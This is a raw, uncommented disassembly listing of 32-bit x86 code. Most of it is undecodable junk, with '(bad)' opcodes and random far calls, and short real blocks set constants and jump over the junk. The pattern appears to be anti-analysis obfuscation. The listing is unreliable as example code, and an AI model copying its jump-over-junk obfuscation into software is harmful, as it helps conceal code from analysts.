  417732:	mov    esi,0x25e3a181
  417737:	add    DWORD PTR [edx+0x70a2bd89],esi
  41773d:	mov    al,0x89
  41773f:	sub    ebp,DWORD PTR [ecx]
  417741:	ss push 0x6c0b9efe
  417747:	fisttp DWORD PTR ds:0x7549d6fa
  41774d:	dec    ecx
  41774e:	(bad)  
  41774f:	push   ebx
  417750:	mov    esi,0x3615a140
  417755:	jae    0x417769
  417757:	and    ch,BYTE PTR gs:[ecx-0x689b6d71]
  41775e:	lods   al,BYTE PTR ds:[esi]
  41775f:	cmp    al,al
  417761:	add    DWORD PTR [eax+edx*4],edx
  417764:	fs jnp 0x417726
  417767:	lock xor edi,DWORD PTR [ebp+0x58]
  41776b:	mov    es:0xcd586828,al
  417771:	cmp    eax,0xf35e6293
  417776:	xlat   BYTE PTR ds:[ebx]
  417777:	int    0x3c
  417779:	ins    DWORD PTR es:[edi],dx
  41777a:	outs   dx,DWORD PTR ds:[esi]
  41777b:	push   ds
  41777c:	call   0xba00:0x1d672083
  417783:	lahf   
  417784:	push   cs
  417785:	and    al,0xb8
  417787:	ins    DWORD PTR es:[edi],dx
  417788:	jmp    0x41779a
  41778a:	retf   0x1abb
  41778d:	inc    esi
  41778e:	mov    edx,0x8ac943b0
  417793:	or     edx,DWORD PTR [ebx]
  417795:	scas   eax,DWORD PTR es:[edi]
  417796:	je     0x417784
  417798:	(bad)
  41779b:	arpl   WORD PTR [ebx],bx
  41779d:	sub    cl,dl
  41779f:	imul   bh
  4177a1:	pop    ebp
  4177a2:	in     al,0x76
  4177a4:	mov    esi,eax
  4177a6:	mov    dh,0x72
  4177a8:	nop
  4177a9:	mov    DWORD PTR [ebp+0xc],0x17e1
  4177b0:	mov    DWORD PTR [ebp+0x8],0x1b0f
  4177b7:	jmp    0x41788b
  4177bc:	xor    al,0x7
  4177be:	and    al,0xcc
  4177c0:	aaa    
  4177c1:	out    dx,eax
  4177c2:	cld    
  4177c3:	(bad)  
  4177c4:	out    dx,al
  4177c5:	pushf  
  4177c6:	int    0x8e
  4177c8:	dec    ebx
  4177c9:	ror    BYTE PTR [esi+0x69],1
  4177cc:	jbe    0x4177d9
  4177ce:	add    DWORD PTR [eax],eax
  4177d0:	mov    bh,0x0
  4177d2:	add    BYTE PTR [eax],al
  4177d4:	xor    al,BYTE PTR [edi]
  4177d6:	pop    edi
  4177d7:	fwait
  4177d8:	xchg   ebx,eax
  4177d9:	(bad)  
  4177db:	xlat   BYTE PTR ds:[ebx]
  4177dc:	push   ss
  4177dd:	out    0xb1,al
  4177df:	sub    eax,0xcec6b2dd
  4177e4:	and    ebp,DWORD PTR [esi+ecx*2-0x51]
  4177e8:	sbb    cl,BYTE PTR [esi]
  4177ea:	xacquire xchg BYTE PTR [edi+eiz*8-0x705ec648],al
  4177f2:	adc    eax,0x2ef504f5
  4177f7:	lock add al,0x2e
  4177fa:	cdq    
  4177fb:	xchg   DWORD PTR [esi-0xc820e27],eax
  417801:	nop
  417802:	sbb    BYTE PTR [ecx-0x38ec5eb4],dl
  417808:	sbb    DWORD PTR [ebx-0x2ca123fe],esi
  41780e:	mov    esi,0x53f405ad
  417813:	pop    edx
  417814:	gs push edx
  417816:	stos   BYTE PTR es:[edi],al
  417817:	inc    esi
  417818:	(bad)  
  417819:	and    BYTE PTR es:[edi+eiz*4-0x48543bbe],bh
  417821:	(bad)  
  417822:	adc    cl,BYTE PTR [edx]
  417824:	pop    esi
  417825:	scas   al,BYTE PTR es:[edi]
  417826:	pop    es
  417827:	xlat   BYTE PTR ds:[ebx]
  417828:	or     ch,ah
  41782a:	dec    edi
  41782b:	sbb    al,0xac
  41782d:	test   bh,0x43
  417830:	aas    
  417831:	pop    ebp
  417832:	leave  
  417833:	inc    ebx
  417834:	rcr    DWORD PTR [ebx+0x13],1
  417837:	or     eax,0x634e159e
  41783c:	ins    BYTE PTR es:[edi],dx
  41783d:	inc    ecx
  41783e:	aam    0x63
  417840:	int3   
  417841:	pop    esp
  417842:	loopne 0x417877
  417844:	lock xor dl,0x2
  417848:	add    eax,0x283df82a
  41784d:	pushf  
  41784e:	jbe    0x41782f
  417850:	push   esp
  417851:	mov    ah,0xd
  417853:	mov    al,0x2
  417855:	mov    bh,0xa0
  417857:	jg     0x41785c
  417859:	mov    eax,0x7bd939a6
  41785e:	cs call 0x37c9:0x19c9664
  417866:	pop    edi
  417867:	pushf  
  417868:	fnstenv [ebp+0x40954de]
  41786e:	(bad)  
  41786f:	in     eax,dx
  417870:	dec    eax
  417871:	cmp    ebx,DWORD PTR [eax]
  417873:	jne    0x4177f9
  417875:	mov    ebp,0xa4407f55
  41787a:	jno    0x4178b1
  41787c:	out    dx,al
  41787d:	test   BYTE PTR [ebx+edx*8],cl
  417880:	cmp    eax,0xddfd44e0
  417885:	mov    ecx,0xf63e6f45
  41788a:	retf   
  41788b:	mov    eax,DWORD PTR [ebp+0x8]
  41788e:	mov    ecx,DWORD PTR [ebp+0xc]
  417891:	and    eax,ecx
  417893:	mov    ecx,DWORD PTR [ebp-0xc]
  417896:	imul   eax,ecx
  417899:	mov    ecx,DWORD PTR [ebp+0x10]
  41789c:	xor    eax,0x1446711
  4178a1:	jmp    0x417975
  4178a6:	cmp    BYTE PTR [esi+ecx*8-0x42a411b5],bl
  4178ad:	jmp    DWORD PTR [edi-0x49]
  4178b0:	mov    al,0xe4
  4178b2:	gs sbb cl,ch
  4178b5:	jo     0x4178e4
  4178b7:	or     al,0x1
  4178b9:	add    BYTE PTR [edi+0x72000000],dh
  4178bf:	lock test BYTE PTR [esi+0x78],dl
  4178c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178c4:	in     al,dx
  4178c5:	sub    BYTE PTR [ebx+ebp*4-0x63],0xdc
  4178ca:	enter  0x211b,0x7e
  4178ce:	add    edi,edi
  4178d0:	push   es
  4178d1:	sub    dh,BYTE PTR [edx]
  4178d3:	cld    
  4178d4:	cmp    BYTE PTR [ebp+0x4d],cl
  4178d7:	repz out dx,eax
  4178d9:	xchg   esp,eax
  4178da:	and    al,0x85
  4178dc:	clc    
  4178dd:	data16 sahf 
  4178df:	sbb    BYTE PTR [edx-0x1e735c17],dh
  4178e5:	scas   eax,DWORD PTR es:[edi]
  4178e6:	aas    
  4178e7:	cdq    
  4178e8:	loopne 0x4178fc
  4178ea:	mov    esp,0x2160c405
  4178ef:	cld    
  4178f0:	lds    esp,FWORD PTR ds:0xa0ec4e11
  4178f6:	sbb    al,0xbf
  4178f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178f9:	dec    ebp
  4178fa:	mov    ch,0x55
  4178fc:	sbb    eax,0x19436f67
  417901:	cwde   
  417902:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417903:	xchg   ebx,eax
  417904:	fst    DWORD PTR [edi-0x1e]
  417907:	pusha  
  417908:	or     DWORD PTR [edi+0x4c],edi
  41790b:	inc    esi
  41790c:	mov    DWORD PTR [ecx+edi*4+0x7a],ebp
  417910:	mov    eax,0x8ba6e11e
  417915:	mov    ah,0x46
  417917:	nop
  417918:	fadd   QWORD PTR [edi+edi*8-0x27ba01d3]
  41791f:	stos   BYTE PTR es:[edi],al
  417920:	and    eax,0x1a897263
  417925:	fmul   DWORD PTR [edi+0x1a]
  417928:	or     eax,0xb0e90eca
  41792d:	sub    al,0xe6
  41792f:	das    
  417930:	inc    eax
  417931:	push   ebp
  417932:	mov    ds:0x2d61298c,al
  417937:	outs   dx,BYTE PTR ds:[esi]
  417938:	push   ss
  417939:	xor    BYTE PTR [ecx],cl
  41793b:	sub    eax,0x513b6dd
  417940:	or     ch,dl
  417942:	sub    al,0x8e
  417944:	scas   eax,DWORD PTR es:[edi]
  417945:	mov    ebp,ebp
  417947:	repnz mov ah,0x0
  41794a:	or     eax,DWORD PTR cs:[bx+0x2c]
  41794f:	pop    ds
  417950:	push   0xffffffb3
  417952:	push   0x5238bf21
  417957:	les    edx,FWORD PTR [eax+0x76]
  41795a:	popa   
  41795b:	pop    ebp
  41795c:	jmp    0x417921
  41795e:	jns    0x417927
  417960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417961:	mov    eax,ds:0xbdfc53c8
  417966:	xchg   ebx,eax
  417967:	mov    bh,0x2b
  417969:	jbe    0x41795d
  41796b:	aad    0x6d
  41796d:	in     al,dx
  41796e:	aas    
  41796f:	out    0x32,eax
  417971:	out    0x56,al
  417973:	sub    bh,BYTE PTR [eax]
  417975:	mov    DWORD PTR [esi+eax*4+0x4],ecx
  417979:	mov    DWORD PTR [ebp-0xc],0x55b6
  417980:	jmp    0x417a54
  417985:	clc    
  417986:	push   0xffffff9c
  417988:	add    eax,0xfff9f79e
  41798d:	pop    es
  41798e:	jmp    0x417971
  417990:	or     eax,0x708dc402
  417995:	in     al,0xc
  417997:	add    DWORD PTR [eax],eax
  417999:	mov    bh,0x0
  41799b:	add    BYTE PTR [eax],al
  41799d:	clc    
  41799e:	call   0x7a68cf5c
  4179a3:	inc    edi
  4179a4:	into   
  4179a5:	je     0x417a1b
  4179a7:	dec    ecx
  4179a8:	retf   0x6edc
  4179ab:	and    ebx,esi
  4179ad:	fs pusha 
  4179af:	es ss fcmovu st,st(6)
  4179b3:	fwait
  4179b4:	adc    BYTE PTR [ecx+0x7e],0x5
  4179b8:	cmp    DWORD PTR [ecx],edx
  4179ba:	outs   dx,BYTE PTR ds:[esi]
  4179bb:	ins    DWORD PTR es:[edi],dx
  4179bc:	and    edx,esp
  4179be:	repnz scas eax,DWORD PTR es:[edi]
  4179c0:	test   eax,0xa55d8f7e
  4179c5:	mov    BYTE PTR [esi],cl
  4179c7:	push   esp
  4179c8:	addr16 daa 
  4179ca:	or     DWORD PTR [ebx+edi*4+0x72269a85],edi
  4179d1:	and    esi,DWORD PTR ds:0x6e392755
  4179d7:	gs jmp 0xa1fb3193
  4179dd:	mov    ebx,0xa4f8707c
  4179e2:	imul   ebp,DWORD PTR [ebx+ebp*4],0xc10a0fc6
  4179e9:	xchg   edx,eax
  4179ea:	arpl   WORD PTR [edi-0x30],dx
  4179ed:	cmc    
  4179ee:	out    0x6b,eax
  4179f0:	xchg   esp,eax
  4179f1:	xor    al,0xfb
  4179f3:	and    eax,0xf33ade66
  4179f8:	mov    eax,ds:0x9ca707d4
  4179fd:	test   DWORD PTR [ecx-0x13],ebx
  417a00:	adc    BYTE PTR [edx+esi*8],0x6c
  417a04:	sbb    al,0xe6
  417a06:	popf   
  417a07:	stos   DWORD PTR es:[edi],eax
  417a08:	xchg   DWORD PTR [eax+0x61dde80b],esp
  417a0e:	push   cs
  417a0f:	aaa    
  417a10:	imul   esi,DWORD PTR [esp+edx*2],0x1
  417a14:	icebp  
  417a15:	sahf   
  417a16:	(bad)  
  417a17:	cmc    
  417a18:	daa    
  417a19:	mov    edx,0x393bb8c6
  417a1e:	jl     0x417a19
  417a20:	repz pop ebp
  417a22:	inc    ebx
  417a23:	nop
  417a24:	cmp    al,bh
  417a26:	xchg   esi,eax
  417a27:	sub    al,0x49
  417a29:	push   0x9e781625
  417a2e:	stos   DWORD PTR es:[edi],eax
  417a2f:	mov    eax,0x6679c137
  417a34:	ss add al,0x58
  417a37:	xchg   edx,eax
  417a38:	add    DWORD PTR [eax+0x54f16bae],edi
  417a3e:	outs   dx,BYTE PTR ds:[esi]
  417a3f:	dec    ebx
  417a40:	(bad)  
  417a41:	mov    ah,0x2a
  417a43:	cmp    esp,DWORD PTR [edi+0x2ae4dc2c]
  417a49:	hlt    
  417a4a:	mov    edi,DWORD PTR [ecx]
  417a4c:	cmp    BYTE PTR [eax-0x20],dh
  417a4f:	add    dl,BYTE PTR ss:[esi+0x45c796cf]
  417a56:	adc    BYTE PTR [edi],dl
  417a58:	imul   eax,DWORD PTR [eax],0x0
  417a5b:	mov    DWORD PTR [ebp+0xc],0x1147
  417a62:	jmp    0x417b36
  417a67:	push   ebx
  417a68:	mov    esi,0x5dff51b3
  417a6d:	repz mov esi,0x6d59db0f
  417a73:	xchg   ecx,edx
  417a75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a76:	aas    
  417a77:	fwait
  417a78:	or     eax,0xb70001
  417a7d:	add    BYTE PTR [eax],al
  417a7f:	push   ss
  417a80:	mov    edx,ebx
  417a82:	enter  0x7309,0xdc
  417a86:	xchg   DWORD PTR [edi-0x2f11d75c],ebp
  417a8c:	fsub   DWORD PTR [edx]
  417a8e:	clc    
  417a8f:	mov    ebx,0x20e9b642
  417a94:	in     al,0xed
  417a96:	pop    es
  417a97:	jmp    0x9208:0xe86ba31a
  417a9e:	push   esi
  417a9f:	pop    ebx
  417aa0:	popa   
  417aa1:	iret   
  417aa2:	adc    DWORD PTR [ebx],edx
  417aa4:	pop    ecx
  417aa5:	add    ah,BYTE PTR [ebx+0x23]
  417aa8:	adc    ch,BYTE PTR [edi-0x7e78ddb7]
  417aae:	pop    ecx
  417aaf:	cmp    eax,0x2e31f3a8
  417ab4:	push   esi
  417ab5:	out    0x38,eax
  417ab7:	ror    DWORD PTR [ebx-0x42be1f4b],0xa9
  417abe:	(bad)  
  417abf:	xchg   edx,eax
  417ac0:	aam    0x46
  417ac2:	mov    edx,0x974f94d8
  417ac7:	mov    ch,0xf
  417ac9:	std    
  417aca:	daa    
  417acb:	fisubr DWORD PTR [edx]
  417acd:	xor    bl,al
  417acf:	retf   0x7014
  417ad2:	jmp    0x913e:0xf7856eed
  417ad9:	inc    ebx
  417ada:	fisub  WORD PTR [edi+0x108abde9]
  417ae0:	push   edi
  417ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ae2:	in     al,dx
  417ae3:	inc    esi
  417ae4:	xor    edx,DWORD PTR [edx]
  417ae6:	pop    esi
  417ae7:	jge    0x417b2e
  417ae9:	loope  0x417aa3
  417aeb:	adc    DWORD PTR [esi+0x1eab1c31],esp
  417af1:	jp     0x417b6f
  417af3:	popa   
  417af4:	out    dx,al
  417af5:	xor    dl,BYTE PTR [eax+0x9]
  417af8:	pop    edi
  417af9:	sbb    BYTE PTR [ecx],dl
  417afb:	loopne 0x417ad8
  417afd:	enter  0xdb11,0xd7
  417b01:	repnz pusha 
  417b03:	sbb    esp,DWORD PTR [edi+0x61c45946]
  417b09:	sub    bl,dl
  417b0b:	bound  esi,QWORD PTR [esi]
  417b0d:	push   edx
  417b0e:	arpl   bx,bx
  417b10:	(bad)  
  417b11:	fnstenv [eax-0x5a]
  417b14:	fwait
  417b15:	or     dh,bl
  417b17:	sub    eax,0x72d1714c
  417b1c:	sti    
  417b1d:	xchg   esi,eax
  417b1e:	or     al,0xfd
  417b20:	inc    ebp
  417b21:	adc    BYTE PTR [eiz*1-0x40de6941],dh
  417b28:	jne    0x417aed
  417b2a:	jg     0x417b69
  417b2c:	fist   WORD PTR [ebx-0x6b55bec]
  417b32:	sbb    DWORD PTR [edi+ecx*4-0x3a],ecx
  417b36:	mov    DWORD PTR [ebp+0x8],0x339a
  417b3d:	mov    eax,DWORD PTR [ebp+0x8]
  417b40:	mov    ecx,DWORD PTR [ebp+0xc]
  417b43:	add    eax,0x3a1a
  417b48:	and    eax,ecx
  417b4a:	mov    ecx,DWORD PTR [ebp+0x10]
  417b4d:	and    eax,ecx
  417b4f:	jmp    0x417c23
  417b54:	cmp    ah,BYTE PTR [eax-0x41907]
  417b5a:	aas    
  417b5b:	cld    
  417b5c:	(bad)  
  417b5d:	imul   edx,DWORD PTR [ebx-0x6b078a33],0xffffffde
  417b64:	push   edx
  417b65:	push   cs
  417b66:	add    DWORD PTR [eax],eax
  417b68:	mov    bh,0x0
  417b6a:	add    BYTE PTR [eax],al
  417b6c:	out    dx,eax
  417b6d:	pushw  es
  417b6f:	cmp    eax,DWORD PTR [ebx+0x45]
  417b72:	adc    cl,BYTE PTR [ecx-0x7]
  417b75:	shr    BYTE PTR [ebp+0x2d],0xcd
  417b79:	dec    ebx
  417b7a:	adc    eax,0x2bba4d23
  417b7f:	or     edi,DWORD PTR [edx]
  417b81:	fmul   QWORD PTR [esi-0x23]
  417b84:	gs in  al,dx
  417b86:	ja     0x417be5
  417b88:	mov    ah,0x5b
  417b8a:	shl    dh,0xce
  417b8d:	adc    dl,BYTE PTR [esi+ebx*8]
  417b90:	test   BYTE PTR ds:0x4151542c,ch
  417b96:	push   eax
  417b97:	push   ebp
  417b98:	fldenv [edx-0x4d]
  417b9b:	cli    
  417b9c:	adc    dh,BYTE PTR [ebx+0x4c5df898]
  417ba2:	mov    ?,WORD PTR [ecx+0x3a273d44]
  417ba8:	aaa    
  417ba9:	rcr    BYTE PTR [ebp+0x4a],0x22
  417bad:	cmp    al,0x9
  417baf:	clc    
  417bb0:	ret    
  417bb1:	mov    edi,0xf0fb337e
  417bb6:	mov    cl,0x9e
  417bb8:	add    eax,0x9b0ec118
  417bbd:	ds stos DWORD PTR es:[edi],eax
  417bbf:	push   es
  417bc0:	push   ecx
  417bc1:	sbb    al,0x7e
  417bc3:	xchg   esi,eax
  417bc4:	jno    0x417b94
  417bc6:	sub    DWORD PTR [ecx-0x44],0xffffffc5
  417bca:	ret    
  417bcb:	in     al,0x83
  417bcd:	(bad)  
  417bce:	(bad)  
  417bd0:	jns    0x417b83
  417bd2:	data16 (bad) 
  417bd4:	mov    ebx,esi
  417bd6:	call   0x1ae5bb40
  417bdb:	pop    es
  417bdc:	push   edx
  417bdd:	cmp    al,0xa3
  417bdf:	adc    DWORD PTR [edx],edi
  417be1:	mov    bl,0x95
  417be3:	xor    BYTE PTR [ecx+0x777ad190],bh
  417be9:	into   
  417bea:	fild   QWORD PTR [edi+0x41]
  417bed:	into   
  417bee:	out    0x23,al
  417bf0:	out    0xc9,al
  417bf2:	or     DWORD PTR [esi-0x51f86023],edx
  417bf8:	mov    dl,dh
  417bfa:	jne    0x417c38
  417bfc:	(bad)  
  417bfe:	xchg   ebx,eax
  417bff:	in     eax,0x57
  417c01:	pusha  
  417c02:	cmc    
  417c03:	pusha  
  417c04:	jnp    0x417b8b
  417c06:	pmuludq mm0,mm1
  417c09:	add    edi,DWORD PTR [ecx+esi*4+0x7e]
  417c0d:	mov    ebx,0xe48111d6
  417c12:	and    BYTE PTR [eax],dh
  417c14:	mov    DWORD PTR [ebx+0x4c9e796a],ecx
  417c1a:	or     eax,0xe074936e
  417c1f:	sar    BYTE PTR [ebx-0x19],cl
  417c22:	pop    edx
  417c23:	mov    ecx,DWORD PTR [ebp-0xc]
  417c26:	xor    eax,ecx
  417c28:	xor    edx,edx
  417c2a:	mov    ecx,0x54b2
  417c2f:	div    ecx
  417c31:	pop    edi
  417c32:	leave  
  417c33:	ret    0xc
  417c36:	push   ebp
  417c37:	mov    ebp,esp
  417c39:	sub    esp,0x78
  417c3c:	jmp    0x417d0b
  417c41:	arpl   WORD PTR [ecx+ebp*2],ax
  417c44:	sub    eax,0x4e676d6f
  417c49:	sub    al,0x11
  417c4b:	nop
  417c4c:	pmulhuw mm3,QWORD PTR [ebx-0x3e]
  417c50:	int    0x9
  417c52:	sgdtd  [eax]
  417c55:	mov    dl,0x0
  417c57:	add    BYTE PTR [eax],al
  417c59:	test   DWORD PTR [eax+0x20c1da1e],edx
  417c5f:	retf   0x31a9
  417c62:	xchg   edi,eax
  417c63:	pavgw  mm5,mm1
  417c66:	adc    eax,DWORD PTR [ebx-0x74]
  417c69:	push   ds
  417c6a:	lods   al,BYTE PTR ds:[esi]
  417c6b:	mov    esp,DWORD PTR [ebx]
  417c6d:	mov    eax,ds:0xb7c1e251
  417c72:	push   es
  417c73:	fimul  DWORD PTR [ecx+0x10]
  417c76:	imul   edi,eax,0xe6ed45d0
  417c7c:	imul   dx,WORD PTR [edi+0x4d],0x3bcd
  417c82:	hlt    
  417c83:	xor    eax,0x7bf6ad33
  417c88:	and    BYTE PTR [ebp+0x100f01a6],al
  417c8e:	push   es
  417c8f:	ins    BYTE PTR es:[edi],dx
  417c90:	xchg   edi,eax
  417c91:	(bad)  
  417c92:	adc    al,0x69
  417c94:	sub    eax,0xdf92f041
  417c99:	and    al,0x6c
  417c9b:	jns    0x417cb7
  417c9d:	mov    WORD PTR [ebx],ds
  417c9f:	add    DWORD PTR [edi+0x51],ebp
  417ca2:	xor    DWORD PTR ds:0xd193d30f,ecx
  417ca8:	(bad)  
  417ca9:	cmp    edi,ebp
  417cab:	xchg   edi,eax
  417cac:	mov    eax,0xfb156401
  417cb1:	ror    BYTE PTR [ecx+edx*8-0x35],cl
  417cb5:	xor    bh,dl
  417cb7:	and    DWORD PTR [ebp-0x249a1c6c],edx
  417cbd:	pusha  
  417cbe:	or     dh,bl
  417cc0:	fs cmp bl,dh
  417cc3:	repz inc edx
  417cc5:	xchg   ebx,eax
  417cc6:	xor    edi,ebp
  417cc8:	or     edi,DWORD PTR [eax]
  417cca:	or     esi,DWORD PTR [esi+0x16]
  417ccd:	xor    esp,DWORD PTR [ecx+0x392b6aec]
  417cd3:	jae    0x417d07
  417cd5:	pop    esp
  417cd6:	call   0x8293:0x961b067b
  417cdd:	test   eax,0x1e8eb2f6
  417ce2:	inc    ebp
  417ce3:	lahf   
  417ce4:	in     eax,dx
  417ce5:	dec    esi
  417ce6:	cwde   
  417ce7:	push   ss
  417ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ce9:	ror    ah,1
  417ceb:	push   0x7d
  417ced:	test   al,0x8d
  417cef:	dec    esp
  417cf0:	hlt    
  417cf1:	stos   DWORD PTR es:[edi],eax
  417cf2:	retf   0xc10e
  417cf5:	xor    dh,bh
  417cf7:	dec    esp
  417cf8:	mov    ds:0x2bb319df,eax
  417cfd:	sbb    cl,BYTE PTR [esi]
  417cff:	fxam   
  417d01:	sbb    bh,BYTE PTR [eax]
  417d03:	clc    
  417d04:	xor    edi,edx
  417d06:	aad    0x56
  417d08:	inc    ebx
  417d09:	inc    edx
  417d0a:	call   0x10c6665
  417d0f:	add    BYTE PTR [eax],al
  417d11:	js     0x417ce3
  417d13:	jl     0x417d06
  417d15:	cld    
  417d16:	std    
  417d17:	std    
  417d18:	fxch   st(2)
  417d1a:	xchg   esi,eax
  417d1b:	(bad)  
  417d1c:	xchg   ebp,eax
  417d1d:	int    0x76
  417d1f:	ror    BYTE PTR [esi-0x45],cl
  417d22:	sgdtd  [eax]
  417d25:	mov    dl,0x0
  417d27:	add    BYTE PTR [eax],al
  417d29:	mov    ds:0xdd38c5be,eax
  417d2e:	or     esi,esi
  417d30:	scas   al,BYTE PTR es:[edi]
  417d31:	imul   edi,DWORD PTR [ebx],0x7d6dcc00
  417d37:	imul   esi,DWORD PTR [eax-0x6c],0x688aa0cd
  417d3e:	imul   esi,DWORD PTR [edi-0x3907ed90],0xffffffcb
  417d45:	xlat   BYTE PTR ds:[ebx]
  417d46:	mov    al,ds:0xc32a05c5
  417d4b:	imul   esi,DWORD PTR [eax-0x61e8c94e],0x1
  417d52:	inc    esi
  417d53:	fwait
  417d54:	dec    esi
  417d55:	ret    0x56f5
  417d58:	popf   
  417d59:	lods   eax,DWORD PTR ds:[esi]
  417d5a:	jnp    0x417da3
  417d5c:	inc    ebx
  417d5d:	sahf   
  417d5e:	xor    BYTE PTR [esi+0x21],cl
  417d61:	dec    ebx
  417d62:	lahf   
  417d63:	arpl   WORD PTR [edi],si
  417d65:	jg     0x417d97
  417d67:	fcom   st(1)
  417d69:	in     eax,dx
  417d6a:	jecxz  0x417de6
  417d6c:	mov    eax,ds:0x2aec95fa
  417d71:	pop    ebx
  417d72:	cmp    dh,ch
  417d74:	stos   BYTE PTR es:[edi],al
  417d75:	push   cs
  417d76:	ds sbb eax,0xeb210fba
  417d7c:	out    0xb4,al
  417d7e:	ins    DWORD PTR es:[edi],dx
  417d7f:	in     al,dx
  417d80:	leave  
  417d81:	mov    ds:0xb537dd78,eax
  417d86:	jns    0x417d4e
  417d88:	outs   dx,DWORD PTR ds:[esi]
  417d89:	push   es
  417d8a:	ficomp DWORD PTR [esi+eax*4-0x27]
  417d8e:	sbb    eax,0x3299d090
  417d93:	jns    0x417d63
  417d95:	je     0x417d38
  417d97:	ds add dh,0x30
  417d9b:	cwde   
  417d9c:	pop    ecx
  417d9d:	adc    dh,BYTE PTR [bx+si]
  417da0:	cmp    eax,0x4cda90a
  417da5:	mov    ecx,0x84cb6402
  417daa:	sub    DWORD PTR [edi],ecx
  417dac:	(bad)  
  417dad:	and    eax,0x9de6fd76
  417db2:	rcl    dh,cl
  417db4:	or     eax,0x59d4436
  417db9:	push   es
  417dba:	mov    al,0x8f
  417dbc:	sbb    eax,esi
  417dbe:	call   0x265bab8a
  417dc3:	and    eax,0xf0dd0c6
  417dc8:	xor    bl,BYTE PTR [esp+ebx*8]
  417dcb:	mov    ebp,0xfacf2f49
  417dd0:	xchg   edi,eax
  417dd1:	int3   
  417dd2:	add    edi,DWORD PTR [ebx-0x3d]
  417dd5:	mov    ebx,0x97eea7c1
  417dda:	push   0xffffffc7
  417ddc:	inc    ebp
  417ddd:	mov    al,ds:0x23df
  417de2:	mov    DWORD PTR [ebp-0x5c],0x7f33
  417de9:	mov    DWORD PTR [ebp-0x58],0x74e0
  417df0:	mov    DWORD PTR [ebp-0x54],0x16db
  417df7:	mov    DWORD PTR [ebp-0x50],0x7319
  417dfe:	jmp    0x417ecd
  417e03:	jae    0x417daf
  417e05:	jmp    0x7c1577da
  417e0a:	stos   DWORD PTR es:[edi],eax
  417e0b:	aam    0x69
  417e0d:	inc    edi
  417e0e:	je     0x417e6a
  417e10:	test   DWORD PTR ds:0x1106d1c,ebx
  417e16:	add    BYTE PTR [edx-0x2e000000],dh
  417e1c:	mov    ds:0xa177acbe,eax
  417e21:	fldcw  WORD PTR [ebx]
  417e23:	mov    ch,0xf5
  417e25:	(bad)  
  417e26:	sbb    esp,edi
  417e28:	retf   
  417e29:	arpl   ax,cx
  417e2b:	push   cs
  417e2c:	mov    esi,0x5fc4d4e2
  417e31:	xlat   BYTE PTR ds:[ebx]
  417e32:	adc    al,0x4e
  417e34:	mov    dl,0x0
  417e36:	out    0x69,eax
  417e38:	xor    ebx,DWORD PTR [esi+eax*4+0x32]
  417e3c:	mov    ebx,0x48e3775e
  417e41:	mov    DWORD PTR [esp+ebx*4],esp
  417e44:	stos   DWORD PTR es:[edi],eax
  417e45:	inc    ebx
  417e46:	sub    esp,DWORD PTR [esi]
  417e48:	pop    ss
  417e49:	ins    BYTE PTR es:[edi],dx
  417e4a:	adc    BYTE PTR [ebx],dl
  417e4c:	pop    ebx
  417e4d:	ror    BYTE PTR [ecx],cl
  417e4f:	dec    ebx
  417e50:	and    al,0xb7
  417e52:	pop    ss
  417e53:	jb     0x417ebf
  417e55:	sub    eax,0xf644ac88
  417e5a:	push   es
  417e5b:	xor    BYTE PTR [ebp+0x6],bl
  417e5e:	push   cs
  417e5f:	cmp    DWORD PTR [edi],esp
  417e61:	mov    ds:0xdebc1014,eax
  417e66:	aad    0xf7
  417e68:	cmp    eax,0xd85e9a1a
  417e6d:	test   DWORD PTR [bx+di-0x67],ebx
  417e71:	cli    
  417e72:	rol    DWORD PTR [edi-0x57b47840],0x54
  417e79:	push   ds
  417e7a:	mov    cl,0xbc
  417e7c:	imul   ecx,DWORD PTR [esi+edx*2+0x38],0x82221403
  417e84:	shl    ebx,0xe0
  417e87:	jl     0x417e34
  417e89:	(bad)  
  417e8a:	pop    ds
  417e8b:	mov    fs,esi
  417e8d:	cmc    
  417e8e:	and    BYTE PTR [ebx+edi*1],ah
  417e91:	pushf  
  417e92:	xchg   ebp,eax
  417e93:	mov    ebx,0xcd792f1f
  417e98:	mov    esp,0x6b3a2f57
  417e9d:	and    BYTE PTR [esp+eiz*8-0x224467ea],bh
  417ea4:	cmp    al,0x21
  417ea6:	dec    eax
  417ea7:	cmc    
  417ea8:	shl    DWORD PTR [eax],cl
  417eaa:	or     al,0x23
  417eac:	in     al,dx
  417ead:	adc    al,0x1d
  417eaf:	or     DWORD PTR [ebp+edx*8-0x1bcbff66],0xffdfbd34
  417eba:	loope  0x417ec1
  417ebc:	imul   ecx,DWORD PTR [ecx],0xffffff86
  417ebf:	sbb    al,0xf8
  417ec1:	cmp    ebp,edx
  417ec3:	fcom   DWORD PTR [edx+eax*1-0x3]
  417ec7:	xchg   edx,eax
  417ec8:	les    eax,FWORD PTR ds:0xc755cf57
  417ece:	inc    ebp
  417ecf:	mov    ah,0x39
  417ed1:	dec    esi
  417ed2:	add    BYTE PTR [eax],al
  417ed4:	jmp    0x417fa3
  417ed9:	add    BYTE PTR [ebx-0x21e2a7e3],0xc7
  417ee0:	fld    TBYTE PTR [ebp+0x7e9f6265]
  417ee6:	mov    ecx,0x111f692a
  417eeb:	add    DWORD PTR [eax],eax
  417eed:	mov    dl,0x0
  417eef:	add    BYTE PTR [eax],al
  417ef1:	les    ecx,FWORD PTR [ebx+0x24fbbb27]
  417ef7:	xchg   ebx,eax
  417ef8:	push   esi
  417ef9:	push   0x45
  417efb:	imul   ebx,eax,0xffffff8b
  417efe:	adc    ecx,ecx
  417f00:	and    al,0xf5
  417f02:	idiv   ch
  417f04:	stos   DWORD PTR es:[edi],eax
  417f05:	lea    ecx,ds:0xb5fbfda
  417f0b:	pop    ebx
  417f0c:	add    ah,BYTE PTR [edi-0x2d]
  417f0f:	add    DWORD PTR [esi-0x7299515e],0xfe5725d3
  417f19:	adc    BYTE PTR [edi],dh
  417f1b:	jle    0x417f25
  417f1d:	mov    esp,0xf3bb2af2
  417f22:	mov    eax,ds:0x120ccf7e
  417f27:	test   DWORD PTR [ecx-0x7c],eax
  417f2a:	mov    al,ds:0xd302726c
  417f2f:	mov    bl,0x56
  417f31:	into   
  417f32:	xor    DWORD PTR [edi+eax*4-0x28dc3aec],ebp
